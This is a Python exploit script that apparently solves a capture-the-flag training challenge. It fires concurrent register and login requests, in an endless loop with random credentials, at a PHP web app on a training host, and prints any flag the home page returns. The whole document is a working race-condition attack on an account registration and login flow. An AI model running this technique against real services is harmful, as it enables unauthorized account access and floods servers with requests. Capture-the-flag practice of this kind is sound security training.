import requests
import threading
import time
import random
import string

base_url = 'http://meta.training.jinblack.it'

def random_user():
    username = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    password = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
    return username, password

def login(session, username, password, log_user = "randomstuff"):
    url = base_url + '/login.php'
    data = {'username': username, 'password': password, 'log_user': log_user}
    response = session.post(url, data=data)
    response = session.get(base_url)
    if('flag' in response.text):
        flag = response.text.split('flag{')[1].split('}')[0]
        print('flag{' + flag + '}')
    return response.text

def register(session, username, password, reg_user = "randomstuff"):
    url = base_url + '/register.php'
    data = {'username': username, 'password_1': password, 'password_2': password, 'reg_user': reg_user}
    response = session.post(url, data=data)
    return response.text

while True:
    s = requests.Session()
    u, p = random_user()

    t1 = threading.Thread(target=register, args=(s, u, p))
    t2 = threading.Thread(target=login, args=(s, u, p))

    t1.start()
    t2.start()

    t1.join()
    t2.join()

    time.sleep(0.1)